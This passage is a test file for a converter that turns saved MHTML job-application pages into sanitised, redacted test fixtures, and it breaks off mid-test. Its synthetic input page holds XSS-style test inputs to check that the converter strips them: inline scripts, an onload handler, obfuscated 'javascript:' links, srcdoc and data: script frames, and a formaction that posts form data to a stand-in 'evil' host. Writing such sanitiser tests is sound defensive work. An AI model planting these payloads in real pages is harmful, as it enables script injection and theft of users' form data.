/*
 * The snapshot converter (scripts/mhtml-to-fixture.mjs). A synthetic capture is built by hand in Blink's own MHTML
 * layout (quoted-printable and base64 parts, a cid: stylesheet holding rules only the CSSOM had, archived frames),
 * converted, and served back the way the e2e harness serves fixtures. The tests check what was inlined, removed and
 * redacted, what the route map answers, that every probe element is shown or hidden exactly as before conversion
 * (measured in Chromium), and that the converter refuses to write a fixture that leaks a listed string or makes a
 * request. A second capture comes from a live page through Chrome's own serializer (CDP Page.captureSnapshot), so
 * the converter is proven against the real format too. Last, the committed Lever and Greenhouse fixtures are checked
 * against their hand-written expectations, so the scanner's oracle stays coherent. Nothing here reaches the network:
 * every request is routed.
 */
import { spawnSync } from 'node:child_process';
import { existsSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { pathToFileURL } from 'node:url';
import { crc32, deflateSync } from 'node:zlib';
import { chromium, type Browser, type BrowserContext, type Frame } from 'playwright';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import {
  ConversionError,
  EMAIL_SOURCE,
  IMAGE_INLINE_MAX,
  PHONE_DIGITS,
  PHONE_SOURCE,
  ashbyRenderId,
  checkedForms,
  convertMhtml,
  imageSize,
  normaliseAshby,
  onAtsHost,
  parseMhtml,
  readRedactList,
  redactSources,
  writeConversion,
} from '../scripts/mhtml-to-fixture.mjs';
import { FIELD_KINDS } from '../src/core/enums';
import { platformOfUrl } from '../src/shared/hosts';

const ROOT = resolve(import.meta.dirname, '..');
const SCRIPT = join(ROOT, 'scripts', 'mhtml-to-fixture.mjs');

const PAGE = 'https://careers.tailorit-fixture.example/jobs/1';
const ORIGIN = 'https://careers.tailorit-fixture.example';
const EMBED = 'https://job-boards.greenhouse.io/embed/job_app?for=tailoritfixture&token=1';
const CAPTCHA = 'https://captcha.tailorit-fixture.example/anchor?k=site-key#frame=1';
const VIEWPORT = { width: 1280, height: 900 };
/** The owner's strings in the redact file: a name, and a phone number written without punctuation. */
const LISTED = ['Jane Roe', '5550100142'];

// ---------------------------------------------------------------------------------------------------------------------
// Building a capture
// ---------------------------------------------------------------------------------------------------------------------

/** A valid RGB PNG: flat grey, or noise that does not compress (to pass IMAGE_INLINE_MAX). */
function png(width: number, height: number, noise: boolean): Buffer {
  const row = 1 + width * 3;
  const raw = Buffer.alloc(row * height, 0x80);
  let seed = 0x2545f491;
  for (let y = 0; y < height; y += 1) {
    raw[y * row] = 0;
    if (!noise) continue;
    for (let x = 1; x < row; x += 1) {
      seed ^= seed << 13;
      seed ^= seed >>> 17;
      seed ^= seed << 5;
      raw[y * row + x] = seed & 0xff;
    }
  }
  const chunk = (type: string, data: Buffer) => {
    const length = Buffer.alloc(4);
    length.writeUInt32BE(data.length);
    const body = Buffer.concat([Buffer.from(type, 'latin1'), data]);
    const crc = Buffer.alloc(4);
    crc.writeUInt32BE(crc32(body) >>> 0);
    return Buffer.concat([length, body, crc]);
  };
  const header = Buffer.alloc(13);
  header.writeUInt32BE(width, 0);
  header.writeUInt32BE(height, 4);
  header[8] = 8;
  header[9] = 2;
  return Buffer.concat([Buffer.from('89504e470d0a1a0a', 'hex'), chunk('IHDR', header), chunk('IDAT', deflateSync(raw)),
    chunk('IEND', Buffer.alloc(0))]);
}

/** Quoted-printable as Blink writes it: =XX for "=" and non-ASCII bytes, soft line breaks before 76 characters. */
function quotedPrintable(text: string): string {
  const lines: string[] = [];
  let line = '';
  for (const byte of Buffer.from(text, 'utf8')) {
    if (byte === 0x0a) {
      lines.push(line);
      line = '';
      continue;
    }
    const token = byte === 0x0d ? '' : byte >= 0x20 && byte < 0x7f && byte !== 0x3d ? String.fromCharCode(byte)
      : `=${byte.toString(16).toUpperCase().padStart(2, '0')}`;
    if (line.length + token.length > 75) {
      lines.push(`${line}=`);
      line = '';
    }
    line += token;
  }
  lines.push(line);
  return lines.join('\r\n');
}

interface Part {
  type: string;
  location?: string;
  id?: string;
  body: string | Buffer;
}

/** An MHTML archive in Blink's layout: headers, then each part quoted-printable (text) or base64 (binary). */
function mhtml(snapshot: string, parts: Part[]): Buffer {
  const boundary = '----MultipartBoundary--tailoritFixtureTest----';
  const out = ['From: <Saved by Blink>', `Snapshot-Content-Location: ${snapshot}`, 'Subject: Synthetic',
    'Date: Thu, 29 Oct 2026 22:38:44 GMT', 'MIME-Version: 1.0', 'Content-Type: multipart/related;',
    '\ttype="text/html";', `\tboundary="${boundary}"`, '', ''];
  for (const part of parts) {
    out.push(`--${boundary}`, `Content-Type: ${part.type}`);
    if (part.id) out.push(`Content-ID: <${part.id}>`);
    const binary = Buffer.isBuffer(part.body);
    out.push(`Content-Transfer-Encoding: ${binary ? 'base64' : 'quoted-printable'}`);
    if (part.location) out.push(`Content-Location: ${part.location}`);
    out.push('', binary ? (part.body.toString('base64').match(/.{1,76}/g) ?? []).join('\r\n') : quotedPrintable(String(part.body)));
  }
  out.push(`--${boundary}--`, '');
  return Buffer.from(out.join('\r\n'), 'latin1');
}

/** The synthetic company page: every kind of thing the converter inlines, removes or redacts, and probe elements.
 *  With `encoded`, a link also carries the owner's name percent-encoded, which the DOM redaction cannot see. */
const mainHtml = (encoded: boolean) => `<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="stylesheet" type="text/css" href="cid:css-cssom@mhtml.blink" />
<link rel="stylesheet" href="${ORIGIN}/site.css">
<link rel="preload" href="${ORIGIN}/font.woff2" as="font"><link rel="icon" href="${ORIGIN}/icon.png">
<link rel="canonical" href="${PAGE}"><base href="${ORIGIN}/"><meta http-equiv="refresh" content="3600">
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
<title>Application for Jane Roe</title><script>window.stolen = true;</script>
<style>.order-b { display: none; } .bg { background-image: url(/badge.png); width: 20px; height: 20px; }</style>
</head><body onload="steal()">
<h1 data-probe="heading" data-expect="shown">Apply to Fixture Co</h1>
<p data-probe="cssom-hidden" data-expect="hidden" class="cssom-hidden">Hidden by a rule only the CSSOM held</p>
<p data-probe="ext-hidden" data-expect="hidden" class="ext-hidden">Hidden by the external stylesheet</p>
<p data-probe="ext-invisible" data-expect="hidden" class="ext-invisible">visibility: hidden</p>
<p data-probe="ext-transparent" data-expect="hidden" class="ext-transparent">opacity: 0</p>
<p data-probe="tiny" data-expect="hidden" class="tiny">Two pixels square</p>
<p data-probe="offscreen" data-expect="hidden" class="offscreen">Off the left edge</p>
<p data-probe="order-a" data-expect="shown" class="order-a">Hidden by the CSSOM sheet, shown again by the later one</p>
<p data-probe="order-b" data-expect="hidden" class="order-b">Shown by the external sheet, hidden by the later style</p>
<p data-probe="attr-hidden" data-expect="hidden" hidden>The hidden attribute</p>
<p data-probe="inline-hidden" data-expect="hidden" style="display:none">An inline style</p>
<div data-probe="background" data-expect="shown" class="bg"></div>
<img data-probe="logo" data-expect="shown" alt="Logo" src="${ORIGIN}/logo.png" srcset="${ORIGIN}/logo.png 1x">
<img data-probe="banner" data-expect="shown" alt="Banner" src="${ORIGIN}/banner.png" loading="lazy">
<p>Welcome back, Jane Roe. <!-- prepared for Jane Roe --> Questions: jobs@tailorit-fixture.example or
+1 (555) 010-0199, or our office line 555-010-0142.</p>
<p><a href="mailto:jobs@tailorit-fixture.example">Write to us</a> <a href="tel:+15550100199">Call us</a>
<a href="javascript:alert(1)">Run</a> <a href="java&#9;script:alert(2)">Run too</a>${encoded ? ` <a href="${ORIGIN}/search?q=Jane%20Roe">Jobs like yours</a>` : ''}</p>
<form action="${ORIGIN}/apply" method="get">
<label for="first" data-probe="label" data-expect="shown">First name</label>
<input id="first" name="first" data-probe="first" data-expect="shown" value="Jane typed" title="Jane Roe" data-owner="jane roe">
<input type="hidden" name="csrf" value="csrf-0123456789abcdefghij">
<input type="checkbox" id="agree" checked><label for="agree">I agree</label>
<select id="state"><option>Texas</option><option selected>Ohio</option></select>
<textarea id="cover">I typed this cover letter</textarea>
<div class="select__control"><div class="select__single-value">Austin, TX</div><div class="select__input-container" data-value="Aus"><input role="combobox" aria-expanded="true" value="Aus"></div></div>
<div role="listbox"><div role="option">Austin, TX</div><div role="option">Dallas, TX</div></div>
<div class="select__multi-value"><div class="select__multi-value__label">Python</div><div class="select__multi-value__remove">x</div></div>
<button type="button" aria-haspopup="listbox">Female</button>
<button type="submit" onclick="send()" formaction="https://evil.tailorit-fixture.example/x" formmethod="get">Submit</button>
</form>
<noscript><img src="${ORIGIN}/pixel.gif"></noscript><object data="${ORIGIN}/plugin.swf"></object><embed src="${ORIGIN}/plugin.swf">
<iframe data-probe="embed" data-expect="shown" src="cid:frame-EMBED@mhtml.blink" width="400" height="300"></iframe>
<iframe src="cid:frame-CAPTCHA@mhtml.blink" width="300" height="80"></iframe>
<iframe src="cid:frame-BLANK@mhtml.blink" width="10" height="10"></iframe>
<iframe srcdoc="&lt;script&gt;parent.stolen = true&lt;/script&gt;" width="10" height="10"></iframe>
<iframe src="data:text/html,%3Cscript%3Eparent.stolen%3Dtrue%3C/script%3E" width="10" height="10"></iframe>
</body></html>`;

const EMBED_HTML = `<!DOCTYPE html><html><head><link rel="stylesheet" href="https://job-boards.greenhouse.io/frame.css"></head>
<body><form action="https://job-boards.greenhouse.io/embed/job_app" method="post">
<label for="email" data-probe="frame-label" data-expect="shown">Email</label>
<input id="email" data-probe="frame-email" data-expect="shown" value="jane.roe@tailorit-fixture.example">
<p class="frame-hidden" data-probe="frame-hidden" data-expect="hidden">Hidden inside the frame</p>
</form></body></html>`;

const SITE_CSS = `@charset "utf-8";
.ext-hidden { display: none; }
.ext-invisible { visibility: hidden; }
.ext-transparent { opacity: 0; }
.tiny { display: block; width: 2px; height: 2px; overflow: hidden; }
.offscreen { position: absolute; left: -9999px; }
.order-a { display: block; }
.order-b { display: block; }
@font-face { font-family: Fixture; src: url("/font.woff2") format("woff2"); }
.badge { background: url("badge.png"); }`;

/** The synthetic capture: the page, a cid: sheet, the stylesheets, three images and three frames. */
function syntheticCapture(encoded = false): Buffer {
  return mhtml(PAGE, [
    { type: 'text/html', id: 'frame-MAIN@mhtml.blink', location: PAGE, body: mainHtml(encoded) },
    { type: 'text/css', location: 'cid:css-cssom@mhtml.blink', body: '@charset "utf-8";\n.cssom-hidden { display: none; }\n.order-a { display: none; }' },
    { type: 'text/css', location: `${ORIGIN}/site.css`, body: SITE_CSS },
    { type: 'image/png', location: `${ORIGIN}/logo.png`, body: png(8, 6, false) },
    { type: 'application/octet-stream', location: `${ORIGIN}/badge.png`, body: png(4, 4, false) },
    { type: 'image/png', location: `${ORIGIN}/banner.png`, body: png(300, 200, true) },
    { type: 'text/html', id: 'frame-EMBED@mhtml.blink', location: EMBED, body: EMBED_HTML },
    { type: 'text/css', location: 'https://job-boards.greenhouse.io/frame.css', body: '.frame-hidden { display: none; }' },
    { type: 'text/html', id: 'frame-CAPTCHA@mhtml.blink', location: CAPTCHA,
      body: '<html><body><input type="hidden" value="captcha-token-0123456789abcdef">I am a captcha</body></html>' },
    { type: 'text/html', id: 'frame-BLANK@mhtml.blink', body: '<html><head></head><body></body></html>' },
  ]);
}

// ---------------------------------------------------------------------------------------------------------------------
// Measuring
// ---------------------------------------------------------------------------------------------------------------------

/** Each probe's state, measured independently of the converter: Chromium's checkVisibility, a box of at least 4 px,
 *  and a box on the page (document coordinates). */
async function probes(frame: Frame): Promise<Record<string, string>> {
  return frame.evaluate(() => {
    const states: Record<string, string> = {};
    for (const element of document.querySelectorAll<HTMLElement>('[data-probe]')) {
      const rect = element.getBoundingClientRect();
      const shown = element.checkVisibility({ checkOpacity: true, checkVisibilityCSS: true }) && rect.width >= 4 &&
        rect.height >= 4 && rect.right + window.scrollX > 0 && rect.bottom + window.scrollY > 0;
      states[element.dataset.probe ?? ''] = shown ? 'shown' : 'hidden';
    }
    return states;
  });
}

/** Each probe's expected state, as the page declares it. */
async function expected(frame: Frame): Promise<Record<string, string>> {
  return frame.evaluate(() => Object.fromEntries([...document.querySelectorAll<HTMLElement>('[data-probe]')]
    .map((element) => [element.dataset.probe ?? '', element.dataset.expect ?? ''])));
}

/** The frame of a page whose address starts with `prefix`. */
function frameAt(frames: Frame[], prefix: string): Frame {
  const frame = frames.find((candidate) => candidate.url().startsWith(prefix));
  if (!frame) throw new Error(`no frame at ${prefix}`);
  return frame;
}

let browser: Browser;
let work: string;

beforeAll(async () => {
  browser = await chromium.launch({ headless: true });
  work = mkdtempSync(join(tmpdir(), 'tailorit-mhtml-'));
});

afterAll(async () => {
  await browser?.close();
  if (work) rmSync(work, { recursive: true, force: true });
});

/** A context that answers the route map's addresses from the conversion's files and records anything else. */
async function servedContext(conversion: Awaited<ReturnType<typeof convertMhtml>>): Promise<{ context: BrowserContext; unexpected: string[] }> {
  const context = await browser.newContext({ viewport: VIEWPORT });
  const unexpected: string[] = [];
  await context.route('**/*', (route) => {
    const url = route.request().url();
    const path = conversion.routes[url];
    const file = conversion.files.find((output) => output.path.split('\\').join('/') === path);
    if (file) return route.fulfill({ status: 200, contentType: 'text/html', body: file.text });
    if (new URL(url).pathname !== '/favicon.ico') unexpected.push(url);
    return route.abort();
  });
  return { context, unexpected };
}

// ---------------------------------------------------------------------------------------------------------------------
// The tests
// ---------------------------------------------------------------------------------------------------------------------

describe('mhtml-to-fixture on a synthetic capture', () => {
  let conversion: Awaited<ReturnType<typeof convertMhtml>>;
  let main: string;
  let frame: string;
  let file: string;

  beforeAll(async () => {
    file = join(work, 'synthetic.mhtml');
    writeFileSync(file, syntheticCapture());
    conversion = await convertMhtml({ file, platform: 'greenhouse', caseName: 'synthetic', redact: LISTED, outDir: work });
    main = conversion.files.find((output) => output.path.endsWith('synthetic.html'))?.text ?? '';
    frame = conversion.files.find((output) => output.path.endsWith('synthetic.frame-1.html'))?.text ?? '';
  }, 60_000);

  it('writes the page, its ATS frame, a stand-in for the third-party frame, and a route map for all three', () => {
    const names = conversion.files.map((output) => output.path.split(/[\\/]/).pop());
    expect(names).toEqual(['synthetic.html', 'synthetic.frame-1.html', 'synthetic.third-party-frame.html']);
    const folder = join(work, 'greenhouse').split('\\').join('/');
    expect(conversion.routes).toEqual({
      [PAGE]: `${folder}/synthetic.html`,
      [EMBED]: `${folder}/synthetic.frame-1.html`,
      [CAPTCHA.split('#')[0] ?? '']: `${folder}/synthetic.third-party-frame.html`,
    });
    // The frames point at their own addresses; the frame without one is left blank.
    expect(main).toContain(`src="${EMBED.replace(/&/g, '&amp;')}"`);
    expect(main).toContain(`src="${CAPTCHA}"`);
    expect(main).not.toContain('cid:');
    // A data: frame would run its own scripts in the fixture: it is blanked like the frame with no web address.
    expect(main).not.toContain('src="data:text/html');
    expect(main).toContain('<iframe width="10" height="10"></iframe>');
    const standIn = conversion.files[2]?.text ?? '';
    expect(standIn).not.toContain('captcha-token');
    expect(standIn).not.toContain('I am a captcha');
  });

  it('records the source, the capture date, the Chrome version and the counts in each header', () => {
    const header = JSON.parse(/<!-- TailorIT fixture[^\n]*\n(\{.*\}) -->/.exec(main)?.[1] ?? '{}');
    expect(header).toMatchObject({ fixture: 'greenhouse/synthetic', source: PAGE, captured: '2026-10-29T22:38:44.000Z' });
    expect(header.chrome).toMatch(/^\d+\.\d+\.\d+\.\d+$/);
    expect(header.chrome).toBe(conversion.chrome);
    expect(header.redacted).toEqual({ typedValues: 4, checked: 1, selected: 1, hiddenValues: 1, widgetText: 3,
      emails: 2, phones: 2, listed: 6 });
    expect(header.removed).toMatchObject({ scripts: 2, eventHandlers: 2, javascriptUrls: 2, bases: 1, metaRefresh: 1,
      metaHttpEquiv: 2, embeds: 2, links: 2, srcdoc: 1 });
    expect(header.inlined).toEqual({ stylesheets: 2, images: 4, placeholders: 1, missing: 1 });
    expect(header.frames).toEqual({ linked: 2, blanked: 2 });
    const frameHeader = JSON.parse(/<!-- TailorIT fixture[^\n]*\n(\{.*\}) -->/.exec(frame)?.[1] ?? '{}');
    expect(frameHeader).toMatchObject({ fixture: 'greenhouse/synthetic.frame-1', source: EMBED });
    expect(frameHeader.redacted.typedValues).toBe(1);
  });

  it('inlines every stylesheet in place and every image as a data: URI, with a same-size stand-in for a large one', () => {
    expect(main).not.toMatch(/<link[^>]*stylesheet/i);
    expect(main).toContain('.cssom-hidden { display: none; }');
    expect(main).toContain('.ext-hidden { display: none; }');
    // The CSSOM sheet still comes before the external one, and the page's own style after both.
    expect(main.indexOf('.cssom-hidden')).toBeLessThan(main.indexOf('.ext-hidden'));
    expect(main.indexOf('.ext-hidden')).toBeLessThan(main.indexOf('.order-b { display: none; }'));
    expect(main).toContain(`src="data:image/png;base64,${png(8, 6, false).toString('base64')}"`);
    expect(main).toContain(`url("data:image/png;base64,${png(4, 4, false).toString('base64')}")`);
    expect(main).toContain('src="data:image/svg+xml;base64,');
    expect(Buffer.from(/src="data:image\/svg\+xml;base64,([^"]+)"/.exec(main)?.[1] ?? '', 'base64').toString())
      .toContain('width="300" height="200"');
    expect(main).toContain('src: url("data:,") format("woff2")');
    expect(main).not.toMatch(/srcset=|loading=/);
    expect(main).toContain(`<link rel="canonical" href="${PAGE}">`);
    expect(frame).toContain('.frame-hidden { display: none; }');
  });

  it('removes scripts, handlers, javascript: URLs, base, meta http-equiv, plugins and srcdoc, and sends forms to /__submitted', () => {
    // The page after its header comment (the header's counts name the things removed).
    for (const text of [main, frame].map((file) => file.slice(file.indexOf('-->') + 3))) {
      expect(text).not.toMatch(/<script|<noscript|<base|http-equiv|<object|<embed|srcdoc|javascript:|\son[a-z]+=/i);
      expect(text).not.toMatch(/stolen|steal\(|send\(/);
    }
    expect(main).toContain('<form action="/__submitted" method="post">');
    expect(main).toContain('formaction="/__submitted"');
    expect(main).not.toContain('formmethod');
    expect(main).not.toContain('evil.tailorit-fixture');
    expect(frame).toContain('<form action="/__submitted" method="post">');
    expect(main.indexOf('<meta charset="utf-8">')).toBe(main.indexOf('<head>') + '<head>'.length);
    // The archive's quoted-printable text breaks lines with CR LF; the fixture uses LF, as git stores it.
    for (const output of conversion.files) expect(output.text.includes('\r'), output.path).toBe(false);
  });

  it('clears typed values and choices, and redacts hidden values, widget text, emails, phones and listed strings', () => {
    expect(main).toContain('<input id="first" name="first" data-probe="first" data-expect="shown" value="" title="REDACTED" data-owner="REDACTED">');
    expect(main).toContain('<textarea id="cover"></textarea>');
    expect(main).toContain('<input type="checkbox" id="agree">');
    expect(main).toContain('<option>Ohio</option>');
    expect(main).toContain('<input type="hidden" name="csrf" value="REDACTED">');
    expect(main).toContain('<div class="select__single-value">REDACTED</div>');
    expect(main).toContain('data-value=""');
    expect(main).toContain('<div class="select__multi-value"><div class="select__multi-value__label">REDACTED</div><div class="select__multi-value__remove">REDACTED</div></div>');
    expect(main).toContain('<button type="button" aria-haspopup="listbox">REDACTED</button>');
    // Option text is page text, not a choice: it stays.
    expect(main).toContain('<div role="option">Austin, TX</div><div role="option">Dallas, TX</div>');
    expect(main).toContain('<title>Application for REDACTED</title>');
    expect(main).toContain('<!-- prepared for REDACTED -->');
    expect(main).toContain('href="mailto:REDACTED"');
    expect(main).toContain('href="tel:REDACTED"');
    for (const text of [main, frame]) {
      expect(text.toLowerCase()).not.toMatch(/jane roe|jane typed|cover letter|csrf-0123|@tailorit-fixture/);
      expect(text).not.toMatch(/010-0199|010-0142|5550100199|Aus"/);
    }
  });

  it('keeps every element shown or hidden exactly as Chromium rendered the capture', async () => {
    // Before: Chromium renders the capture itself, without the page's CSP, as the converter does (the fixture drops
    // the CSP meta, which would otherwise block the capture's own cid: frames).
    const original = await browser.newContext({ javaScriptEnabled: false, bypassCSP: true, viewport: VIEWPORT });
    await original.route(/^https?:/, (route) => route.abort());
    const page = await original.newPage();
    await page.goto(pathToFileURL(file).href);
    const before = { main: await probes(page.mainFrame()), frame: await probes(frameAt(page.frames(), 'cid:frame-EMBED')) };
    const wanted = { main: await expected(page.mainFrame()), frame: await expected(frameAt(page.frames(), 'cid:frame-EMBED')) };
    await original.close();
    // After: the fixture, served at its real addresses with JavaScript on, as the e2e harness serves it.
    const { context, unexpected } = await servedContext(conversion);
    const served = await context.newPage();
    await served.goto(PAGE);
    const after = { main: await probes(served.mainFrame()), frame: await probes(frameAt(served.frames(), EMBED)) };
    await context.close();
    expect(Object.keys(before.main)).toHaveLength(17);
    expect(before).toEqual(wanted);
    expect(after).toEqual(before);
    expect(unexpected).toEqual([]);
  }, 60_000);
});

describe('mhtml-to-fixture refusals', () => {
  it('refuses a listed string that survives percent-encoded, and names the entry, not the value', async () => {
    const file = join(work, 'refuse.mhtml');
    writeFileSync(file, syntheticCapture(true));
    const error = await convertMhtml({ file, platform: 'greenhouse', caseName: 'refuse', redact: ['Jane Roe'], outDir: work })
      .then(() => null, (caught: unknown) => caught);
    expect(error).toBeInstanceOf(ConversionError);
    const reasons = (error as ConversionError).reasons;
    expect(reasons).toEqual(['refuse.html: redact entry 1 is still in the file']);
    expect(reasons.join(' ')).not.toContain('Jane');
    expect(existsSync(join(work, 'greenhouse', 'refuse.html'))).toBe(false);
  }, 60_000);

  it('refuses a fixture that would make a request the route map does not answer', async () => {
    const file = join(work, 'request.mhtml');
    const html = '<!DOCTYPE html><html><head><style>.x { background-image: image-set("https://cdn.tailorit-fixture.example/x.png" 1x); width: 9px; height: 9px; }</style></head><body><div class="x"></div></body></html>';
    writeFileSync(file, mhtml(PAGE, [{ type: 'text/html', id: 'frame-MAIN@mhtml.blink', location: PAGE, body: html }]));
    await expect(convertMhtml({ file, platform: 'lever', caseName: 'request', outDir: work }))
      .rejects.toThrow('the fixture requests 1 addresses the route map does not answer: cdn.tailorit-fixture.example');
  }, 60_000);

  it('refuses bad arguments before opening a browser', async () => {
    await expect(convertMhtml({ file: 'x.mhtml', platform: 'workable', caseName: 'x' })).rejects.toThrow('--platform must be one of');
    await expect(convertMhtml({ file: 'x.mhtml', platform: 'lever', caseName: 'Not A Case' })).rejects.toThrow('--case must be');
    await expect(convertMhtml({ file: 'x.html', platform: 'lever', caseName: 'x' })).rejects.toThrow('must be an .mhtml file');
  });
});

describe('mhtml-to-fixture on a live page saved by Chrome itself', () => {
  // Chrome's serializer saves every <style> as a cid: sheet ahead of the page's <link> sheets and drops
  // adoptedStyleSheets, so a capture can differ from the live page where the cascade order decides; the probes here
  // do not depend on it (docs/FIXTURES.md).
  it('keeps the visibility of every probe, CSSOM-only rules and a cross-origin frame included', async () => {
    const live = await browser.newContext({ viewport: VIEWPORT });
    const pages: Record<string, { type: string; body: string | Buffer }> = {
      [PAGE]: { type: 'text/html', body: `<!DOCTYPE html><html><head><link rel="stylesheet" href="/site.css"><style id="js"></style>
<script>document.getElementById('js').sheet.insertRule('.js-hidden { display: none; }');
document.getElementById('js').sheet.insertRule('.js-tiny { display: block; width: 3px; height: 3px; overflow: hidden; }');</script></head><body>
<p data-probe="js-hidden" class="js-hidden">Hidden by a rule a script inserted</p>
<p data-probe="ext-hidden" class="ext-hidden">Hidden by the external sheet</p>
<p data-probe="js-tiny" class="js-tiny">Three pixels square, by a rule a script inserted</p>
<p data-probe="ext-shown" class="ext-shown">Shown</p>
<label for="name" data-probe="label">Name</label><input id="name" data-probe="name">
<img data-probe="logo" src="/logo.png"><iframe data-probe="embed" src="${EMBED}" width="400" height="200"></iframe>
<script>document.getElementById('name').setAttribute('value', 'Jane Roe');</script></body></html>` },
      [`${ORIGIN}/site.css`]: { type: 'text/css', body: '.ext-hidden { display: none; } .ext-shown { display: block; }' },
      [`${ORIGIN}/logo.png`]: { type: 'image/png', body: png(8, 6, false) },
      [EMBED]: { type: 'text/html', body: `<!DOCTYPE html><html><head><style>.frame-hidden { visibility: hidden; }</style></head>
<body><label for="e" data-probe="frame-label">Email</label><input id="e" data-probe="frame-email" type="email">
<p class="frame-hidden" data-probe="frame-hidden">Hidden inside the frame</p></body></html>` },
    };
    await live.route('**/*', (route) => {
      const entry = pages[route.request().url()];
      return entry ? route.fulfill({ status: 200, contentType: entry.type, body: entry.body }) : route.abort();
    });
    const page = await live.newPage();
    await page.goto(PAGE);
    const before = { main: await probes(page.mainFrame()), frame: await probes(frameAt(page.frames(), EMBED)) };
    const session = await live.newCDPSession(page);
    const { data } = await session.send('Page.captureSnapshot', { format: 'mhtml' });
    await live.close();
    const file = join(work, 'live.mhtml');
    writeFileSync(file, data);

    const conversion = await convertMhtml({ file, platform: 'greenhouse', caseName: 'live', redact: ['Jane Roe'], outDir: work });
    const { context, unexpected } = await servedContext(conversion);
    const served = await context.newPage();
    await served.goto(PAGE);
    const after = { main: await probes(served.mainFrame()), frame: await probes(frameAt(served.frames(), EMBED)) };
    await context.close();
    expect(before.main).toEqual({ 'js-hidden': 'hidden', 'ext-hidden': 'hidden', 'js-tiny': 'hidden', 'ext-shown': 'shown',
      label: 'shown', name: 'shown', logo: 'shown', embed: 'shown' });
    expect(before.frame).toEqual({ 'frame-label': 'shown', 'frame-email': 'shown', 'frame-hidden': 'hidden' });
    expect(after).toEqual(before);
    expect(unexpected).toEqual([]);
    const text = conversion.files.map((output) => output.text).join('\n');
    expect(text).not.toMatch(/<script|Jane Roe/);
  }, 60_000);
});

describe('mhtml-to-fixture command line', () => {
  it('writes the files and the route map, and replaces an earlier conversion of the same case', () => {
    const file = join(work, 'cli.mhtml');
    writeFileSync(file, syntheticCapture(true));
    const redact = join(work, 'redact.txt');
    writeFileSync(redact, '# the owner\nJane Roe\n\n555 010 0142\nJane%20Roe\n');
    const out = join(work, 'cli-out');
    writeConversion({ files: [], routes: {}, chrome: '', tokens: [], notes: [], counts: {} }, join(out, 'greenhouse'), 'cli');
    writeFileSync(join(out, 'greenhouse', 'cli.frame-7.html'), 'stale');
    const run = spawnSync(process.execPath, [SCRIPT, file, '--platform', 'greenhouse', '--case', 'cli', '--redact', redact,
      '--out', out], { encoding: 'utf8', windowsHide: true, timeout: 60_000 });
    expect(run.stderr).toBe('');
    expect(run.status).toBe(0);
    expect(run.stdout).toContain('cli.mhtml -> greenhouse/cli');
    expect(run.stdout).toMatch(/cli\.html {2}\d+\.\d KiB/);
    for (const name of ['cli.html', 'cli.frame-1.html', 'cli.third-party-frame.html', 'cli.routes.json']) {
      expect(existsSync(join(out, 'greenhouse', name)), name).toBe(true);
    }
    expect(existsSync(join(out, 'greenhouse', 'cli.frame-7.html'))).toBe(false);
    const routes = JSON.parse(readFileSync(join(out, 'greenhouse', 'cli.routes.json'), 'utf8'));
    expect(Object.keys(routes)).toEqual([PAGE, EMBED, CAPTCHA.split('#')[0]]);
    const written = readFileSync(join(out, 'greenhouse', 'cli.html'), 'utf8');
    expect(written).not.toMatch(/Jane|010-0142/);
    expect(run.stdout).not.toMatch(/Jane|jobs@|010-01/);
  }, 60_000);

  it('exits 1 and writes nothing when the conversion is refused', () => {
    const file = join(work, 'cli-refused.mhtml');
    writeFileSync(file, syntheticCapture(true));
    const redact = join(work, 'redact-refused.txt');
    writeFileSync(redact, 'Jane Roe\n');
    const out = join(work, 'cli-refused-out');
    const run = spawnSync(process.execPath, [SCRIPT, file, '--platform', 'greenhouse', '--case', 'refused', '--redact', redact,
      '--out', out], { encoding: 'utf8', windowsHide: true, timeout: 60_000 });
    expect(run.status).toBe(1);
    expect(run.stderr).toContain('nothing was written');
    expect(run.stderr).toContain('redact entry 1 is still in the file');
    expect(run.stderr).not.toContain('Jane');
    expect(existsSync(out)).toBe(false);
  }, 60_000);

  it('explains its usage', () => {
    const run = spawnSync(process.execPath, [SCRIPT, '--platform', 'lever'], { encoding: 'utf8', windowsHide: true });
    expect(run.status).toBe(1);
    expect(run.stderr).toContain('usage: node scripts/mhtml-to-fixture.mjs <file.mhtml> --platform');
  });
});

describe('mhtml-to-fixture helpers', () => {
  it('reads MIME parts: quoted-printable with soft breaks, base64, Content-ID and Content-Location', () => {
    const archive = parseMhtml(mhtml(PAGE, [
      { type: 'text/html', id: 'frame-A@mhtml.blink', location: PAGE, body: `<p class="${'x'.repeat(90)}">\u00c5land = 1</p>` },
      { type: 'image/png', location: `${ORIGIN}/logo.png`, body: png(8, 6, false) },
    ]));
    expect(archive.snapshotUrl).toBe(PAGE);
    expect(archive.date).toBe('Thu, 29 Oct 2026 22:38:44 GMT');
    expect(archive.parts.map((part) => [part.contentType, part.contentId, part.location])).toEqual([
      ['text/html', 'cid:frame-A@mhtml.blink', PAGE], ['image/png', null, `${ORIGIN}/logo.png`]]);
    expect(archive.parts[0]?.body.toString('utf8')).toBe(`<p class="${'x'.repeat(90)}">\u00c5land = 1</p>`);
    expect(archive.parts[1]?.body.equals(png(8, 6, false))).toBe(true);
    expect(() => parseMhtml(Buffer.from('<html></html>'))).toThrow('not an MHTML file');
  });

  it('reads image sizes from PNG, GIF and JPEG headers', () => {
    expect(imageSize(png(300, 200, false))).toEqual({ width: 300, height: 200 });
    const gif = Buffer.from('474946383961' + '2c01' + 'c800' + '000000', 'hex');
    expect(imageSize(gif)).toEqual({ width: 300, height: 200 });
    // SOI, an APP0 segment, then SOF0 with height 200 and width 300.
    const jpeg = Buffer.from('ffd8' + 'ffe00004' + '0000' + 'ffc00011' + '08' + '00c8' + '012c' + '03' + '00'.repeat(12), 'hex');
    expect(imageSize(jpeg)).toEqual({ width: 300, height: 200 });
    expect(imageSize(Buffer.from('not an image'))).toBeNull();
    expect(png(300, 200, true).length).toBeGreaterThan(IMAGE_INLINE_MAX);
  });

  it('reads the redact file, refuses entries that would redact too much, and matches phone numbers in any spelling', () => {
    expect(readRedactList('# comment\n  Jane Roe  \n\n555-010-0142\r\n')).toEqual(['Jane Roe', '555-010-0142']);
    expect(() => readRedactList('Jo\n')).toThrow('entry 1 is shorter than 3 characters');
    const [name, phone] = redactSources(['J.R. (Jane)', '+1 555 010 0142']).map((source) => new RegExp(source, 'i'));
